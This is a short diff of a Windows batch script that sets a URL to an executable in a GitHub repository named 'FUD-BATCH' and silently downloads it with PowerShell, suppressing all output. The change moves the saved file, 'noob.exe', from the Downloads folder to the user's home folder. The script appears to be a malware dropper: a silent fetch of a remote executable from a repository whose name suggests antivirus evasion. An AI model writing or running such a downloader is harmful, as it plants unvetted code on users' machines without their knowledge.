@@ -3,7 +3,7 @@ setlocal
 
 :: Set the download URL and the target path for 3.exe
 set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/1.exe"
-set "output1=C:\Users\%USERNAME%\Downloads\noob.exe"
+set "output1=C:\Users\%USERNAME%\noob.exe"
 
 :: Download the 3.exe file using PowerShell silently
 powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%output1%'" >nul 2>&1
